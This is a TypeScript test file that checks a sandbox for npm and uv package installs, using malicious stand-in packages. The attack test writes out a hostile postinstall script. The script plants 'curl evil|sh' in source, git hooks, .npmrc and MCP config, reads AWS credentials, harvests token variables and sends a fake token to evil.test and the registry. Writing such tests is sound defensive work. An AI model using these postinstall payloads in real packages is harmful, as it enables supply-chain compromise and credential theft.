// Live tests of caged package installs (M5): a real `npm install` of a
// local tarball whose postinstall is a malicious stand-in, and the same
// install of a well-behaved package. The lifecycle scripts run; the network
// reaches only the registry; writes land only in node_modules, the
// lockfile, the manifest's dependency fields and ignored build output.
// Real namespaces; local files and stand-ins only.

import { execFileSync, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { containmentSupport } from "./host.js";
import { containPackageInstall } from "./mcp.js";
import { lookupProgram } from "./plan.js";
import { fakeHome, planContext, refusals, startStandIns, tempTree } from "./test-helpers.js";

const live = containmentSupport().ok && lookupProgram("npm") !== null;

const GIT_ENV = {
  ...process.env,
  GIT_CONFIG_NOSYSTEM: "1",
  GIT_CONFIG_GLOBAL: "/dev/null",
  GIT_AUTHOR_NAME: "t",
  GIT_AUTHOR_EMAIL: "t@example.test",
  GIT_COMMITTER_NAME: "t",
  GIT_COMMITTER_EMAIL: "t@example.test",
};
const git = (cwd: string, ...args: string[]) =>
  execFileSync("git", args, { cwd, env: GIT_ENV, encoding: "utf8" });

/** A package tarball (npm's layout: package/...) with the given postinstall. */
function tarball(dir: string, name: string, postinstall: string): string {
  const pkg = path.join(dir, `${name}-src`, "package");
  fs.mkdirSync(pkg, { recursive: true });
  fs.writeFileSync(
    path.join(pkg, "package.json"),
    JSON.stringify({
      name,
      version: "1.0.0",
      main: "index.js",
      scripts: { postinstall: "node postinstall.js" },
    }),
  );
  fs.writeFileSync(path.join(pkg, "index.js"), "module.exports = 42;\n");
  fs.writeFileSync(path.join(pkg, "postinstall.js"), postinstall);
  const out = path.join(dir, `${name}-1.0.0.tgz`);
  execFileSync("tar", ["-czf", out, "-C", path.dirname(pkg), "package"]);
  return out;
}

function project(dir: string) {
  fs.mkdirSync(path.join(dir, "src"), { recursive: true });
  fs.mkdirSync(path.join(dir, "vendor"));
  git(dir, "init", "-q", "-b", "main");
  fs.writeFileSync(path.join(dir, ".gitignore"), "node_modules/\ndist/\n");
  fs.writeFileSync(path.join(dir, "src", "index.js"), "console.log('app');\n");
  fs.writeFileSync(
    path.join(dir, "package.json"),
    `${JSON.stringify({ name: "victim", version: "1.0.0", scripts: { test: "node src/index.js" } }, null, 2)}\n`,
  );
  git(dir, "add", "-A");
  git(dir, "commit", "-q", "-m", "init");
}

async function install(
  proj: string,
  tgz: string,
  home: string,
  stateDir: string,
  upstream: Parameters<typeof containPackageInstall>[1]["upstream"],
) {
  const events: Array<{ type: string; [k: string]: unknown }> = [];
  const out = await containPackageInstall(
    {
      label: "npm install",
      tool: "npm",
      projectDir: proj,
      command: "npm",
      args: ["install", `./vendor/${path.basename(tgz)}`, "--no-audit", "--no-fund"],
      env: { npm_config_update_notifier: "false" },
    },
    { stateDir, upstream, onEvent: (e) => events.push(e as { type: string }) },
    planContext(home),
  );
  if (!out.ok) {
    throw new Error(out.message);
  }
  const c = out.containment;
  const child = spawn(c.argv[0], c.argv.slice(1), {
    env: { ...c.env },
    stdio: ["ignore", "pipe", "pipe"],
  });
  let stdout = "";
  let stderr = "";
  child.stdout.on("data", (d: Buffer) => (stdout += d.toString("utf8")));
  child.stderr.on("data", (d: Buffer) => (stderr += d.toString("utf8")));
  const code = await new Promise<number | null>((r) => child.on("exit", (x) => r(x)));
  await c.close();
  return { code, stdout, stderr, events };
}

describe.skipIf(!live)("containment: caged package installs (M5)", () => {
  let root: string;
  let home: string;
  let stateDir: string;
  beforeAll(() => {
    root = tempTree("contain-install");
    home = fakeHome(root);
    stateDir = path.join(root, "state");
  });
  afterAll(() => {
    fs.rmSync(root, { recursive: true, force: true });
  });

  it("attack: a malicious postinstall cannot touch the project's source, exec config, manifest scripts, credentials or the network", async () => {
    const proj = path.join(root, "victim");
    project(proj);
    const evil = `
const fs = require("fs"); const path = require("path"); const https = require("https");
const P = process.env.INIT_CWD; const r = {};
const w = (k, p, c) => { try { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, c); r[k] = "WROTE"; } catch (e) { r[k] = e.code; } };
w("src", P + "/src/index.js", "require('child_process').exec('curl evil|sh')");
w("mcp", P + "/.mcp.json", '{"mcpServers":{"evil":{"command":"sh"}}}');
w("claude", P + "/.claude/settings.json", "{}");
w("hook", P + "/.git/hooks/pre-commit", "#!/bin/sh\\ncurl evil");
w("gitignore", P + "/.gitignore", "*");
w("npmrc", P + "/.npmrc", "script-shell=/tmp/evil");
w("backdoor", P + "/backdoor.js", "evil()");
w("hidden", P + "/.hidden-persist", "evil()");
const pj = JSON.parse(fs.readFileSync(P + "/package.json", "utf8"));
pj.scripts.test = "curl evil | sh"; pj.bin = { ls: "backdoor.js" };
w("manifest", P + "/package.json", JSON.stringify(pj));
w("own", __dirname + "/built.txt", "ok");
try { fs.readFileSync(require("os").homedir() + "/.aws/credentials"); r.aws = "READ"; } catch (e) { r.aws = e.code; }
r.env = Object.keys(process.env).filter((k) => /TOKEN|SECRET|AWS|NPM_TOKEN/.test(k));
const get = (u) => new Promise((res) => https.get(u, (x) => { x.resume(); res("HTTP " + x.statusCode); }).on("error", (e) => res(e.code || e.message)));
(async () => {
  r.evil = await get("https://evil.test/x");
  r.registryLeak = await get("https://registry.npmjs.org/-/x?t=ghp_abcdefghijklmnopqrstuvwxyz0123456789");
  fs.writeFileSync(__dirname + "/result.json", JSON.stringify(r));
})();
`;
    const tgz = tarball(root, "evil", evil);
    fs.copyFileSync(tgz, path.join(proj, "vendor", path.basename(tgz)));
    git(proj, "add", "-A");
    git(proj, "commit", "-q", "-m", "vendor");
    const before = {
      src: fs.readFileSync(path.join(proj, "src", "index.js"), "utf8"),
      gitignore: fs.readFileSync(path.join(proj, ".gitignore"), "utf8"),
      manifest: JSON.parse(fs.readFileSync(path.join(proj, "package.json"), "utf8")),
    };
    const registry = await startStandIns({
      "registry.npmjs.org": () => ({ status: 404, body: "{}" }),
    });
    process.env.NPM_TOKEN = "npm_hostTokenThatMustNotLeak000000000000";
    let r;
    try {
      r = await install(proj, tgz, home, stateDir, registry.upstream);
    } finally {
      delete process.env.NPM_TOKEN;
      await registry.close();
    }
    const result = JSON.parse(
      fs.readFileSync(path.join(proj, "node_modules", "evil", "result.json"), "utf8"),
    );
    for (const k of ["src", "mcp", "claude", "hook", "gitignore", "npmrc"]) {
      expect([k, result[k]]).toEqual([k, expect.stringMatching(/^(EROFS|EACCES)$/)]);
    }
    expect(result.own).toBe("WROTE");
    expect(result.aws).toBe("ENOENT");
    expect(result.env).toEqual([]);
    expect(result.evil).not.toMatch(/^HTTP/);
    expect(result.registryLeak).toBe("HTTP 403");
    expect(registry.requests).toEqual([]);
    // The cage's post-run check: the planted files are gone (quarantined),
    // the manifest keeps only npm's own change, and the install fails.
    expect(r.code, `${r.stdout}\n${r.stderr}`).toBe(125);
    expect(r.stderr).toMatch(/the install wrote outside node_modules/);
    expect(fs.existsSync(path.join(proj, "backdoor.js"))).toBe(false);
    expect(fs.existsSync(path.join(proj, ".hidden-persist"))).toBe(false);
    expect(fs.readFileSync(path.join(proj, "src", "index.js"), "utf8")).toBe(before.src);
    expect(fs.readFileSync(path.join(proj, ".gitignore"), "utf8")).toBe(before.gitignore);
    const manifest = JSON.parse(fs.readFileSync(path.join(proj, "package.json"), "utf8"));
    expect(manifest.scripts).toEqual(before.manifest.scripts);
    expect(manifest.bin).toBeUndefined();
    for (const p of [".mcp.json", ".claude", ".npmrc", ".git/hooks/pre-commit"]) {
      expect([p, fs.existsSync(path.join(proj, p))]).toEqual([p, false]);
    }
    const cage = r.events.find(
      (e) => e.type === "refused" && e.code === "containment-install-cage",
    ) as
      | { violations: Array<{ path: string; what: string; quarantinedTo: string | null }> }
      | undefined;
    expect(
      cage?.violations
        .map((v) => [path.basename(v.path), v.what].join(" "))
        .toSorted((x, y) => x.localeCompare(y)),
    ).toEqual([
      ".hidden-persist new-entry",
      "backdoor.js new-entry",
      "package.json manifest-changed",
    ]);
    for (const v of cage!.violations) {
      expect(v.quarantinedTo && fs.existsSync(v.quarantinedTo)).toBeTruthy();
    }
    expect(refusals(r.events as never).map((x) => x.code)).toEqual(
      expect.arrayContaining([
        "destination-not-declared",
        // The registry takes only package fetches (its request shape): the
        // credential-carrying query is refused by the shape, before DLP reads it.
        "request-shape-query",
        "containment-install-cage",
      ]),
    );
  });

  it("false positive: a real npm install from the registry (audit on) passes the registry's request shape, and its pinned tarball is verified", async () => {
    const proj = path.join(root, "from-registry");
    project(proj);
    const src = path.join(root, "left-pad-src", "package");
    fs.mkdirSync(src, { recursive: true });
    fs.writeFileSync(
      path.join(src, "package.json"),
      JSON.stringify({ name: "left-pad", version: "1.3.0", main: "index.js" }),
    );
    fs.writeFileSync(path.join(src, "index.js"), "module.exports = (s) => s;\n");
    const tgzPath = path.join(root, "left-pad-1.3.0.tgz");
    execFileSync("tar", ["-czf", tgzPath, "-C", path.dirname(src), "package"]);
    const tgz = fs.readFileSync(tgzPath);
    const integrity = `sha512-${createHash("sha512").update(tgz).digest("base64")}`;
    const tarballPath = "/left-pad/-/left-pad-1.3.0.tgz";
    const packument = JSON.stringify({
      name: "left-pad",
      "dist-tags": { latest: "1.3.0" },
      versions: {
        "1.3.0": {
          name: "left-pad",
          version: "1.3.0",
          main: "index.js",
          dist: { tarball: `https://registry.npmjs.org${tarballPath}`, integrity },
        },
      },
    });
    const registry = await startStandIns({
      "registry.npmjs.org": (q) =>
        q.path === "/left-pad"
          ? { status: 200, body: packument }
          : q.path === tarballPath
            ? { status: 200, body: tgz, headers: { "content-type": "application/octet-stream" } }
            : { status: 404, body: "{}" },
    });
    const events: Array<{ type: string; [k: string]: unknown }> = [];
    let code: number | null = null;
    let stderr = "";
    try {
      const out = await containPackageInstall(
        {
          label: "npm install",
          tool: "npm",
          projectDir: proj,
          command: "npm",
          args: ["install", "left-pad"],
          env: { npm_config_update_notifier: "false" },
          pins: { [tarballPath]: integrity },
        },
        { stateDir, upstream: registry.upstream, onEvent: (e) => events.push(e as never) },
        planContext(home),
      );
      if (!out.ok) {
        throw new Error(out.message);
      }
      const c = out.containment;
      const child = spawn(c.argv[0], c.argv.slice(1), {
        env: { ...c.env },
        stdio: ["ignore", "pipe", "pipe"],
      });
      child.stderr.on("data", (d: Buffer) => (stderr += d.toString("utf8")));
      code = await new Promise<number | null>((r) => child.on("exit", (x) => r(x)));
      await c.close();
    } finally {
      await registry.close();
    }
    expect(code, stderr).toBe(0);
    expect(
      fs.readFileSync(path.join(proj, "node_modules", "left-pad", "index.js"), "utf8"),
    ).toContain("module.exports");
    // What npm sent to install reached the registry; nothing it needs was refused.
    const fetched = registry.requests.map((q) => `${q.method} ${q.path}`);
    expect(fetched).toEqual(expect.arrayContaining(["GET /left-pad", `GET ${tarballPath}`]));
    // Only npm's audit report (a POST to /-/npm/v1/security/...) may be refused: the install does not need it.
    const refused = refusals(events as never);
    expect(
      refused.every((x) => x.code === "request-shape-method"),
      JSON.stringify(refused),
    ).toBe(true);
  });

  it("false positive: a normal install of a package with a postinstall succeeds; dependency, lockfile and ignored build output land", async () => {
    const proj = path.join(root, "app");
    project(proj);
    const good = `
const fs = require("fs");
fs.writeFileSync(__dirname + "/native-build.txt", "built");
fs.mkdirSync(process.env.INIT_CWD + "/dist", { recursive: true });
fs.writeFileSync(process.env.INIT_CWD + "/dist/generated.js", "// generated");
`;
    const tgz = tarball(root, "good", good);
    fs.copyFileSync(tgz, path.join(proj, "vendor", path.basename(tgz)));
    git(proj, "add", "-A");
    git(proj, "commit", "-q", "-m", "vendor");
    const registry = await startStandIns({
      "registry.npmjs.org": () => ({ status: 404, body: "{}" }),
    });
    let r;
    try {
      r = await install(proj, tgz, home, stateDir, registry.upstream);
    } finally {
      await registry.close();
    }
    expect(r.code, `${r.stdout}\n${r.stderr}`).toBe(0);
    expect(refusals(r.events as never)).toEqual([]);
    expect(
      fs.readFileSync(path.join(proj, "node_modules", "good", "native-build.txt"), "utf8"),
    ).toBe("built");
    expect(fs.readFileSync(path.join(proj, "dist", "generated.js"), "utf8")).toBe("// generated");
    const manifest = JSON.parse(fs.readFileSync(path.join(proj, "package.json"), "utf8"));
    expect(manifest.dependencies).toEqual({ good: "file:vendor/good-1.0.0.tgz" });
    expect(fs.existsSync(path.join(proj, "package-lock.json"))).toBe(true);
    // Only the manifest and the new lockfile differ from the commit; no placeholder is left.
    expect(git(proj, "status", "--porcelain").split("\n").filter(Boolean).toSorted()).toEqual([
      " M package.json",
      "?? package-lock.json",
    ]);
  });

  it("pyproject installs: a dependency added by a uv/poetry-style tool is kept; any other change to pyproject.toml is undone", async () => {
    const run = async (proj: string, evil: boolean) => {
      fs.mkdirSync(path.join(proj, "src", "app"), { recursive: true });
      git(proj, "init", "-q", "-b", "main");
      fs.writeFileSync(
        path.join(proj, "pyproject.toml"),
        [
          "[project]",
          'name = "app"',
          'version = "0.1.0"',
          "dependencies = [",
          '  "httpx>=0.27", # pinned below',
          "]",
          "",
          "[build-system]",
          'requires = ["setuptools>=68"]',
          'build-backend = "setuptools.build_meta"',
          "",
        ].join("\n"),
      );
      fs.writeFileSync(path.join(proj, ".gitignore"), ".venv/\n");
      // A stand-in for `uv add requests`: edits the dependency array, writes
      // uv.lock, the virtualenv and pip's build metadata. The malicious one
      // also adds a console script and swaps the build backend.
      fs.writeFileSync(
        path.join(proj, "src", "uvstand.py"),
        [
          "import os, sys",
          "p = 'pyproject.toml'",
          "t = open(p).read()",
          "t = t.replace('dependencies = [\\n', 'dependencies = [\\n  \"requests>=2.32\",\\n', 1)",
          "if sys.argv[1] == 'evil':",
          "    t = t.replace('setuptools.build_meta', 'evil_backend') + '\\n[project.scripts]\\nls = \"evil:main\"\\n'",
          "open(p, 'w').write(t)",
          "open('uv.lock', 'w').write('version = 1\\n')",
          "os.makedirs('.venv/lib/site-packages/requests', exist_ok=True)",
          "open('.venv/lib/site-packages/requests/__init__.py', 'w').write('')",
          "os.makedirs('app.egg-info', exist_ok=True)",
          "open('app.egg-info/PKG-INFO', 'w').write('Name: app')",
          "print('added')",
        ].join("\n"),
      );
      git(proj, "add", "-A");
      git(proj, "commit", "-q", "-m", "init");
      const events: Array<{ type: string; [k: string]: unknown }> = [];
      const out = await containPackageInstall(
        {
          label: "uv add requests",
          tool: "uv",
          projectDir: proj,
          command: "python3",
          args: ["-I", "-B", "src/uvstand.py", evil ? "evil" : "good"],
          programs: ["python3"],
        },
        { stateDir, onEvent: (e) => events.push(e as { type: string }) },
        planContext(home),
      );
      if (!out.ok) {
        throw new Error(out.message);
      }
      const c = out.containment;
      const child = spawn(c.argv[0], c.argv.slice(1), {
        env: { ...c.env },
        stdio: ["ignore", "pipe", "pipe"],
      });
      let stderr = "";
      child.stderr.on("data", (d: Buffer) => (stderr += d.toString("utf8")));
      const code = await new Promise<number | null>((r) => child.on("exit", (x) => r(x)));
      await c.close();
      return {
        code,
        stderr,
        events,
        toml: fs.readFileSync(path.join(proj, "pyproject.toml"), "utf8"),
      };
    };
    const good = await run(path.join(root, "py-good"), false);
    expect(good.code, good.stderr).toBe(0);
    expect(good.toml).toContain('"requests>=2.32"');
    expect(refusals(good.events as never)).toEqual([]);
    expect(fs.existsSync(path.join(root, "py-good", "uv.lock"))).toBe(true);
    expect(fs.existsSync(path.join(root, "py-good", "app.egg-info", "PKG-INFO"))).toBe(true);
    const bad = await run(path.join(root, "py-evil"), true);
    expect(bad.code).toBe(125);
    expect(bad.toml).not.toContain("evil");
    expect(bad.toml).toContain("setuptools.build_meta");
    expect(refusals(bad.events as never).map((x) => x.code)).toContain("containment-install-cage");
  });
});
